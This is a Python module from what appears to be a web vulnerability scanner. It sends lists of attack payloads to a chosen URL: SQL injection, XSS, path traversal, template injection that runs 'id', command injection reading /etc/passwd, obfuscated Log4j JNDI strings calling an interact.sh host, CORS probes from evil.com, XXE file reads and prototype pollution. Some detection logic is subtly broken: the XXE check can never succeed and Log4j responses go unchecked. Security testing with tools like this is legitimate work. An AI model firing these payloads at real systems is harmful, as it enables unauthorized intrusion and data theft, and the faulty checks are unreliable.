import hashlib
import json
import random
import string
import time
from typing import Dict, List, Optional, Callable
from urllib.parse import quote, urlencode
from app.utils.http_client import http_request
from app.utils.logger import get_logger

logger = get_logger("fuzzer_engine")

SQL_ERROR_PATTERNS = [
    "you have an error in your sql syntax",
    "warning: mysql", "unclosed quotation mark",
    "microsoft ole db provider for odbc drivers",
    "microsoft ole db provider for sql server",
    "incorrect syntax near", "unexpected end of sql command",
    "invalid query", "sql syntax", "pg_query", "pg_exec",
    "sqlite3", "sqlite_error", "sqlstate",
    "ora-00933", "ora-00921", "ora-01756",
    "postgresql", "valid mysql result",
    "supplied argument is not a valid mysql",
    "column count doesn't match",
    "mysql_num_rows", "mysql_fetch",
    "mysqli", "PDOException",
    "org.postgresql", "com.mysql",
]

XSS_REFLECTION_MARKERS = [
    "<script>", "<img", "onerror=", "onload=", "onfocus=",
    "javascript:", "prompt(", "alert(", "confirm(",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    "..%00/etc/passwd",
    "/proc/self/environ", "/proc/self/cmdline",
]

SSTI_PAYLOADS = [
    ("{{7*7}}", "49"),
    ("${7*7}", "49"),
    ("<%= 7*7 %>", "49"),
    ("#{7*7}", "49"),
    ("{{config}}", "SECRET"),
    ("{{''.__class__.__mro__[1].__subclasses__()}}", "__subclasses__"),
    ("${T(java.lang.Runtime).getRuntime().exec('id')}", "exec"),
    ("{{lipsum.__globals__['os'].popen('id').read()}}", "uid="),
]

LOG4J_PAYLOADS = [
    "${jndi:ldap://TARGET/wyqyan}",
    "${${lower:j}ndi:ldap://TARGET/wyqyan}",
    "${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://TARGET/wyqyan}",
    "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//TARGET/wyqyan}",
    "${jndi:${lower:l}${lower:d}a${lower:p}://TARGET/wyqyan}",
    "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://TARGET/wyqyan}",
    "${${what:-j}${what:-n}${what:-d}${what:-i}:ldap://TARGET/wyqyan}",
    "${${upper:j}ndi:ldap://TARGET/wyqyan}",
    "${${lower:jndi}:${lower:ldap}://TARGET/wyqyan}",
    "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//TARGET/wyqyan}",
]

CMD_INJECTION_PAYLOADS = [
    (";id", "uid="),
    ("|id", "uid="),
    ("||id", "uid="),
    ("&&id", "uid="),
    ("`id`", "uid="),
    ("$(id)", "uid="),
    (";cat /etc/passwd", "root:"),
    ("|cat /etc/passwd", "root:"),
    ("$(cat /etc/passwd)", "root:"),
    ("`cat /etc/passwd`", "root:"),
    ("%0aid", "uid="),
    ("%0a%0did", "uid="),
    ("'%0aid'", "uid="),
    ('"\\nid"', "uid="),
    (";sleep 5", "sleep"),
    ("|sleep 5", "sleep"),
    ("$(sleep 5)", "sleep"),
]

CORS_PAYLOADS = [
    {"Origin": "https://evil.com"},
    {"Origin": "null"},
    {"Origin": "https://TARGET.evil.com"},
    {"Origin": "https://subdomain.TARGET"},
    {"Origin": "evil.TARGET"},
]

HEADERS_TO_FUZZ = [
    "X-Forwarded-For", "X-Real-IP", "X-Original-URL",
    "X-Rewrite-URL", "X-Custom-IP-Authorization",
    "Referer", "X-Forwarded-Host", "X-Host",
    "Client-IP", "True-Client-IP", "Cluster-Client-IP",
    "X-ProxyUser-IP", "Base-Url", "X-Original-Forwarded-For",
]


class SmartFuzzer:
    def __init__(self, target_url: str, timeout: int = 10, concurrency: int = 10):
        self.target_url = target_url.rstrip("/")
        self.timeout = timeout
        self.concurrency = concurrency
        self.baseline = None
        self.findings = []

    def smart_fuzz(self) -> Dict:
        self._get_baseline()
        self._fuzz_sql_injection()
        self._fuzz_xss()
        self._fuzz_path_traversal()
        self._fuzz_ssti()
        self._fuzz_cmd_injection()
        self._fuzz_log4j()
        self._fuzz_cors()
        self._fuzz_header_injection()
        self._fuzz_http_methods()
        self._fuzz_content_type()
        return {
            "target": self.target_url,
            "total_findings": len(self.findings),
            "findings": self.findings,
            "scan_time": time.time(),
        }

    def _get_baseline(self):
        try:
            resp = http_request("GET", self.target_url, timeout=self.timeout, verify=False)
            if resp:
                self.baseline = {
                    "status": resp.get("status_code", 200),
                    "length": len(resp.get("text", "")),
                    "time": resp.get("response_time", 0),
                }
        except Exception:
            pass

    def _fuzz_sql_injection(self):
        sqli_payloads = [
            ("'", "SQL syntax|mysql|ORA-|syntax error|pg_query"),
            ("' OR '1'='1", "SQL syntax|mysql|ORA-|syntax error"),
            ("1' ORDER BY 1--", "SQL syntax|Unknown column"),
            ("1' UNION SELECT NULL--", "SQL syntax|The used SELECT"),
            ("1 AND 1=1", ""),
            ("1 AND 1=2", ""),
            ("1' AND '1'='1", ""),
            ("1' AND SLEEP(5)--", ""),
            ("1; WAITFOR DELAY '0:0:5'--", ""),
            ("1' OR '1'='1' --", ""),
        ]
        for payload, indicator in sqli_payloads:
            resp = http_request("GET", f"{self.target_url}?id={quote(payload)}",
                              timeout=self.timeout, verify=False)
            if resp:
                body = str(resp.get("text", "")).lower()
                for pattern in SQL_ERROR_PATTERNS:
                    if pattern.lower() in body:
                        self.findings.append({
                            "type": "sql_injection",
                            "payload": payload,
                            "evidence": pattern,
                            "risk_level": "critical",
                            "detail": f"SQL注入漏洞，触发错误: {pattern[:100]}",
                        })
                        break

    def _fuzz_xss(self):
        xss_payloads = [
            '<script>alert("wyqyan")</script>',
            '"><img src=x onerror=alert(1)>',
            "'-alert(1)-'",
            "javascript:alert(1)",
            '<svg onload=alert(1)>',
            '"><svg/onload=confirm(1)>',
            "{{constructor.constructor('alert(1)')()}}",
        ]
        for payload in xss_payloads:
            resp = http_request("GET", f"{self.target_url}?q={quote(payload)}",
                              timeout=self.timeout, verify=False)
            if resp and payload in str(resp.get("text", "")):
                self.findings.append({
                    "type": "xss_reflected",
                    "payload": payload,
                    "risk_level": "high",
                    "detail": "XSS反射漏洞，Payload未经过滤直接输出",
                })

    def _fuzz_path_traversal(self):
        for payload in PATH_TRAVERSAL_PAYLOADS:
            resp = http_request("GET", f"{self.target_url}?file={quote(payload)}",
                              timeout=self.timeout, verify=False)
            if resp:
                body = str(resp.get("text", ""))
                if "root:" in body or "[boot loader]" in body or "[extensions]" in body:
                    self.findings.append({
                        "type": "path_traversal",
                        "payload": payload,
                        "risk_level": "critical",
                        "detail": "路径穿越漏洞，可读取系统敏感文件",
                    })

    def _fuzz_ssti(self):
        for payload, marker in SSTI_PAYLOADS:
            resp = http_request("GET", f"{self.target_url}?name={quote(payload)}",
                              timeout=self.timeout, verify=False)
            if resp and marker in str(resp.get("text", "")):
                self.findings.append({
                    "type": "ssti",
                    "payload": payload,
                    "marker": marker,
                    "risk_level": "critical",
                    "detail": f"SSTI服务端模板注入漏洞，标记 {marker} 被执行",
                })

    def _fuzz_cmd_injection(self):
        for payload, indicator in CMD_INJECTION_PAYLOADS:
            resp = http_request("GET", f"{self.target_url}?cmd={quote(payload)}",
                              timeout=self.timeout, verify=False)
            if resp and indicator in str(resp.get("text", "")):
                self.findings.append({
                    "type": "command_injection",
                    "payload": payload,
                    "indicator": indicator,
                    "risk_level": "critical",
                    "detail": "命令注入漏洞，可执行任意系统命令",
                })

    def _fuzz_log4j(self):
        for payload_template in LOG4J_PAYLOADS:
            payload = payload_template.replace("TARGET", f"wyqyan-{int(time.time())}.log.interact.sh")
            for param in ["q", "search", "id", "name", "user", "input"]:
                url = f"{self.target_url}?{param}={quote(payload)}"
                headers = {
                    "X-Api-Version": payload,
                    "User-Agent": payload,
                    "Referer": payload,
                    "X-Forwarded-For": payload,
                }
                resp = http_request("GET", url, headers=headers, timeout=self.timeout, verify=False)

    def _fuzz_cors(self):
        for cors_headers in CORS_PAYLOADS:
            headers = {k: v.replace("TARGET", self.target_url.split("//")[-1].split("/")[0])
                      for k, v in cors_headers.items()}
            resp = http_request("GET", self.target_url, headers=headers,
                              timeout=self.timeout, verify=False)
            if resp:
                resp_headers = resp.get("headers", {})
                acao = resp_headers.get("access-control-allow-origin", "")
                if acao:
                    if acao == "*" or "evil" in acao or "null" in acao:
                        self.findings.append({
                            "type": "cors_misconfiguration",
                            "origin": headers.get("Origin", ""),
                            "acao": acao,
                            "risk_level": "high",
                            "detail": f"CORS配置错误，允许Origin: {headers.get('Origin')} → ACAO: {acao}",
                        })

    def _fuzz_header_injection(self):
        for header in HEADERS_TO_FUZZ:
            headers = {header: "127.0.0.1"}
            resp = http_request("GET", self.target_url, headers=headers,
                              timeout=self.timeout, verify=False)
            if resp:
                baseline_status = self.baseline.get("status", 200) if self.baseline else 200
                if resp.get("status_code") != baseline_status and resp.get("status_code") in (200, 302):
                    self.findings.append({
                        "type": "header_injection",
                        "header": header,
                        "baseline_status": baseline_status,
                        "injected_status": resp.get("status_code"),
                        "risk_level": "medium",
                        "detail": f"通过 {header} 头可影响响应状态码",
                    })

    def _fuzz_http_methods(self):
        methods = ["OPTIONS", "PUT", "DELETE", "PATCH", "TRACE", "CONNECT"]
        for method in methods:
            resp = http_request(method, self.target_url, timeout=self.timeout, verify=False)
            if resp and resp.get("status_code") in (200, 201, 204):
                if method in ("PUT", "DELETE"):
                    self.findings.append({
                        "type": "dangerous_http_method",
                        "method": method,
                        "status_code": resp.get("status_code"),
                        "risk_level": "high",
                        "detail": f"HTTP {method} 方法可用",
                    })

    def _fuzz_content_type(self):
        payloads = [
            ("application/xml", "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"),
            ("application/json", '{"__proto__":{"isAdmin":true}}'),
        ]
        for content_type, body in payloads:
            resp = http_request("POST", self.target_url, data=body,
                              headers={"Content-Type": content_type},
                              timeout=self.timeout, verify=False)
            if resp:
                if "xxe" in content_type and "root:" in str(resp.get("text", "")):
                    self.findings.append({
                        "type": "xxe",
                        "risk_level": "critical",
                        "detail": "XXE外部实体注入漏洞",
                    })
                if "proto" in body and resp.get("status_code") == 200:
                    self.findings.append({
                        "type": "prototype_pollution",
                        "risk_level": "high",
                        "detail": "可能存在原型链污染漏洞",
                    })


def smart_fuzz(target_url: str, timeout: int = 10) -> Dict:
    fuzzer = SmartFuzzer(target_url, timeout)
    return fuzzer.smart_fuzz()
